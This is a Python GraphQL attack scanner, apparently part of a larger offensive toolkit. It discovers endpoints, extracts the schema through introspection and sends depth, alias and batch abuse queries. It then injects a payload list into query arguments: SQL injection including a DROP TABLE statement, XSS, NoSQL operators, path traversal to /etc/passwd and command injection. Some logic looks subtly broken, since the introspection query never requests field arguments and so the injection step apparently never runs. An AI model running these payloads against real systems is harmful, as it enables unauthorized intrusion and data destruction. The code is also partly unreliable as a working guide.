#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import json
import random
import urllib.parse
from typing import List, Dict, Optional, Any
from modules.core.http_client import HTTPClient
from core.logger import log_info, log_success, log_warning, log_error, log_debug

class GraphQLScanner:
    """
    Advanced GraphQL Scanner
    Supports: Endpoint Discovery, Introspection, Schema Extraction,
              Query Depth Attack, Field Duplication, Batch Requests,
              Argument Injection (SQLi, XSS, IDOR)
    """

    def __init__(self, target: str, verbose: bool = False):
        self.target = target.rstrip('/')
        self.verbose = verbose
        self.client = HTTPClient(timeout=30, retries=5, verbose=verbose)
        self.results = []
        self.endpoints = []
        self.schema = {}
        self.vulnerabilities = []

        # Common GraphQL endpoints to check
        self.common_endpoints = [
            "/graphql",
            "/api/graphql",
            "/v1/graphql",
            "/v2/graphql",
            "/v3/graphql",
            "/graphiql",
            "/graphql/console",
            "/api/graphiql",
            "/graphql/explorer",
            "/api/explorer",
            "/graphql/playground",
            "/api/playground",
            "/graphql/schema",
            "/api/schema",
            "/gql",
            "/api/gql",
            "/query",
            "/api/query"
        ]

        # Introspection query to extract schema
        self.introspection_query = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              kind
              name
              description
              fields {
                name
                description
                type {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                    }
                  }
                }
              }
              inputFields {
                name
                description
                type {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
              interfaces {
                name
              }
              enumValues {
                name
                description
              }
              possibleTypes {
                name
              }
            }
            directives {
              name
              description
              locations
              args {
                name
                description
                type {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
        """

        # Payloads for argument injection
        self.injection_payloads = [
            # SQL Injection
            {"type": "sqli", "value": "' OR '1'='1"},
            {"type": "sqli", "value": "' OR 1=1--"},
            {"type": "sqli", "value": "' UNION SELECT NULL--"},
            {"type": "sqli", "value": "'; DROP TABLE users--"},
            # XSS
            {"type": "xss", "value": "<script>alert(1)</script>"},
            {"type": "xss", "value": "<img src=x onerror=alert(1)>"},
            {"type": "xss", "value": "javascript:alert(1)"},
            # IDOR (numeric)
            {"type": "idor", "value": "0"},
            {"type": "idor", "value": "999999"},
            {"type": "idor", "value": "-1"},
            # NoSQL
            {"type": "nosql", "value": "{'$ne': ''}"},
            {"type": "nosql", "value": "{'$gt': ''}"},
            {"type": "nosql", "value": "{'$regex': '.*'}"},
            # Path Traversal
            {"type": "lfi", "value": "../../../etc/passwd"},
            {"type": "lfi", "value": "../../../../etc/passwd"},
            # Command Injection
            {"type": "rce", "value": ";id"},
            {"type": "rce", "value": "|id"},
            {"type": "rce", "value": "&id"}
        ]

        # Error patterns for GraphQL
        self.error_patterns = [
            "GraphQL error",
            "SQL syntax",
            "mysql_fetch",
            "ORA-",
            "PostgreSQL",
            "SQLite",
            "Microsoft OLE DB",
            "Microsoft Access",
            "Invalid query",
            "Unknown column",
            "Table '.*' doesn't exist",
            "Column '.*' not found",
            "Syntax error",
            "PDOException",
            "SQLSTATE",
            "mysqli_sql_exception",
            "Division by zero",
            "Column count doesn't match",
            "Duplicate entry",
            "Data truncated",
            "Invalid use of group function",
            "Subquery returns more than 1 row",
            "Expression is not in GROUP BY clause",
            "Unknown table",
            "View '.*' doesn't exist",
            "Can't create table",
            "Access denied",
            "Table '.*' is marked as crashed",
            "Lock wait timeout exceeded",
            "Deadlock found when trying to get lock"
        ]

    def discover_endpoints(self) -> List[str]:
        """Discover GraphQL endpoints by checking common paths"""
        log_info("Discovering GraphQL endpoints...")
        endpoints = []
        for path in self.common_endpoints:
            url = f"{self.target}{path}"
            # Try GET with introspection query
            try:
                query = urllib.parse.quote(self.introspection_query)
                test_url = f"{url}?query={query}"
                resp = self.client.get(test_url)
                if resp and resp.status_code == 200:
                    data = resp.json()
                    if 'data' in data and '__schema' in data['data']:
                        endpoints.append(url)
                        log_success(f"Found GraphQL endpoint: {url}")
                    elif 'errors' in data:
                        endpoints.append(url)
                        log_success(f"Found GraphQL endpoint (with errors): {url}")
            except:
                pass

            # Try POST with introspection query
            if url not in endpoints:
                try:
                    headers = {"Content-Type": "application/json"}
                    payload = {"query": self.introspection_query}
                    resp = self.client.post(url, json=payload, headers=headers)
                    if resp and resp.status_code == 200:
                        data = resp.json()
                        if 'data' in data and '__schema' in data['data']:
                            endpoints.append(url)
                            log_success(f"Found GraphQL endpoint (POST): {url}")
                        elif 'errors' in data:
                            endpoints.append(url)
                            log_success(f"Found GraphQL endpoint (POST with errors): {url}")
                except:
                    pass

        self.endpoints = endpoints
        return endpoints

    def extract_schema(self, endpoint: str) -> Dict:
        """Extract GraphQL schema using introspection"""
        log_info(f"Extracting schema from {endpoint}...")
        try:
            headers = {"Content-Type": "application/json"}
            payload = {"query": self.introspection_query}
            resp = self.client.post(endpoint, json=payload, headers=headers)
            if resp and resp.status_code == 200:
                data = resp.json()
                if 'data' in data and '__schema' in data['data']:
                    self.schema = data['data']['__schema']
                    log_success(f"Schema extracted successfully. Found {len(self.schema.get('types', []))} types.")
                    return self.schema
                elif 'errors' in data:
                    log_warning(f"Introspection returned errors: {data['errors']}")
                    return {}
            else:
                log_warning(f"Introspection failed with status: {resp.status_code if resp else 'N/A'}")
        except Exception as e:
            log_error(f"Introspection error: {e}")
        return {}

    def test_query_depth(self, endpoint: str, type_name: str, field_name: str) -> bool:
        """Test for query depth attack by nesting fields"""
        log_info(f"Testing query depth on {type_name}.{field_name}...")
        depth_query = f"query {{ {type_name} {{ {field_name} {{ {field_name} {{ {field_name} {{ {field_name} {{ {field_name} {{ {field_name} {{ {field_name} {{ {field_name} {{ {field_name} }} }} }} }} }} }} }} }} }} }}"
        payload = {"query": depth_query}
        try:
            resp = self.client.post(endpoint, json=payload)
            if resp and resp.status_code == 200:
                data = resp.json()
                if 'errors' in data:
                    for error in data['errors']:
                        if 'depth' in error.get('message', '').lower() or 'limit' in error.get('message', '').lower():
                            log_success(f"Query depth limit detected! Depth attack blocked.")
                            self.vulnerabilities.append({
                                "type": "query_depth_limit",
                                "endpoint": endpoint,
                                "field": f"{type_name}.{field_name}",
                                "detail": "Depth limit is enforced"
                            })
                            return True
                else:
                    log_warning(f"No depth limit detected for {type_name}.{field_name}")
                    self.vulnerabilities.append({
                        "type": "query_depth_vulnerable",
                        "endpoint": endpoint,
                        "field": f"{type_name}.{field_name}",
                        "detail": "Deeply nested query allowed"
                    })
                    return False
        except Exception as e:
            log_debug(f"Depth test error: {e}")
        return False

    def test_field_duplication(self, endpoint: str, type_name: str, field_name: str) -> bool:
        """Test for field duplication attack (aliases)"""
        log_info(f"Testing field duplication on {type_name}.{field_name}...")
        # Create 50 aliases of the same field
        aliases = []
        for i in range(50):
            aliases.append(f"alias{i}: {field_name}")
        query = f"query {{ {type_name} {{ {', '.join(aliases)} }} }}"
        payload = {"query": query}
        try:
            resp = self.client.post(endpoint, json=payload)
            if resp and resp.status_code == 200:
                data = resp.json()
                if 'errors' in data:
                    for error in data['errors']:
                        if 'alias' in error.get('message', '').lower() or 'duplicate' in error.get('message', '').lower():
                            log_success(f"Alias limit detected! Duplication attack blocked.")
                            self.vulnerabilities.append({
                                "type": "alias_limit",
                                "endpoint": endpoint,
                                "field": f"{type_name}.{field_name}",
                                "detail": "Alias limit is enforced"
                            })
                            return True
                else:
                    log_warning(f"No alias limit detected for {type_name}.{field_name}")
                    self.vulnerabilities.append({
                        "type": "alias_vulnerable",
                        "endpoint": endpoint,
                        "field": f"{type_name}.{field_name}",
                        "detail": "Multiple aliases allowed"
                    })
                    return False
        except Exception as e:
            log_debug(f"Alias test error: {e}")
        return False

    def test_batch_requests(self, endpoint: str) -> bool:
        """Test for batch request vulnerability"""
        log_info(f"Testing batch requests on {endpoint}...")
        # Send multiple queries in one request
        batch_payload = [
            {"query": "query { __typename }"},
            {"query": "query { __typename }"},
            {"query": "query { __typename }"},
            {"query": "query { __typename }"},
            {"query": "query { __typename }"}
        ]
        try:
            resp = self.client.post(endpoint, json=batch_payload)
            if resp and resp.status_code == 200:
                data = resp.json()
                if isinstance(data, list) and len(data) == 5:
                    log_warning(f"Batch requests allowed! Attack possible.")
                    self.vulnerabilities.append({
                        "type": "batch_requests",
                        "endpoint": endpoint,
                        "detail": "Multiple queries allowed in one request"
                    })
                    return True
        except:
            pass
        return False

    def test_argument_injection(self, endpoint: str, type_name: str, field_name: str, arg_name: str) -> bool:
        """Test for argument injection vulnerabilities"""
        log_info(f"Testing argument injection on {type_name}.{field_name}({arg_name})...")
        for payload_info in self.injection_payloads:
            payload_value = payload_info["value"]
            query = f"query {{ {type_name} {{ {field_name}({arg_name}: \"{payload_value}\") {{ {field_name} }} }} }}"
            payload = {"query": query}
            try:
                resp = self.client.post(endpoint, json=payload)
                if resp and resp.status_code == 200:
                    data = resp.json()
                    if 'errors' in data:
                        error_msg = str(data['errors']).lower()
                        # Check for SQL errors
                        for pattern in self.error_patterns:
                            if re.search(pattern, error_msg, re.IGNORECASE):
                                self.vulnerabilities.append({
                                    "type": f"injection_{payload_info['type']}",
                                    "endpoint": endpoint,
                                    "field": f"{type_name}.{field_name}({arg_name})",
                                    "payload": payload_value,
                                    "error_pattern": pattern
                                })
                                log_success(f"Injection ({payload_info['type']}) found on {field_name}({arg_name}) with payload: {payload_value}")
                                return True
            except Exception as e:
                log_debug(f"Injection test error: {e}")
        return False

    def run(self) -> Dict:
        log_info(f"Starting GraphQL scan on: {self.target}")

        # Step 1: Discover endpoints
        endpoints = self.discover_endpoints()
        if not endpoints:
            log_warning("No GraphQL endpoints found.")
            return {
                "target": self.target,
                "scan_type": "graphql",
                "endpoints": [],
                "schema": {},
                "vulnerabilities": []
            }

        # Step 2: For each endpoint, extract schema and test
        for endpoint in endpoints:
            log_info(f"Scanning endpoint: {endpoint}")
            schema = self.extract_schema(endpoint)
            if not schema:
                log_warning(f"Could not extract schema from {endpoint}")
                continue

            # Get query type fields
            query_type_name = schema.get('queryType', {}).get('name')
            if query_type_name:
                query_type = next((t for t in schema.get('types', []) if t.get('name') == query_type_name), None)
                if query_type and query_type.get('fields'):
                    fields = query_type.get('fields', [])
                    log_info(f"Found {len(fields)} query fields")

                    # Test each field for vulnerabilities
                    for field in fields:
                        field_name = field.get('name')
                        if not field_name:
                            continue
                        field_type = field.get('type', {})
                        type_name = field_type.get('name', 'Unknown')

                        # Test depth
                        self.test_query_depth(endpoint, query_type_name, field_name)

                        # Test alias duplication
                        self.test_field_duplication(endpoint, query_type_name, field_name)

                        # Test argument injection
                        args = field.get('args', [])
                        for arg in args:
                            arg_name = arg.get('name')
                            if arg_name:
                                self.test_argument_injection(endpoint, query_type_name, field_name, arg_name)

            # Test batch requests
            self.test_batch_requests(endpoint)

        # Summary
        log_success(f"GraphQL scan completed. Found {len(self.vulnerabilities)} vulnerabilities.")
        return {
            "target": self.target,
            "scan_type": "graphql",
            "endpoints": self.endpoints,
            "schema": self.schema,
            "vulnerability_count": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities
        }
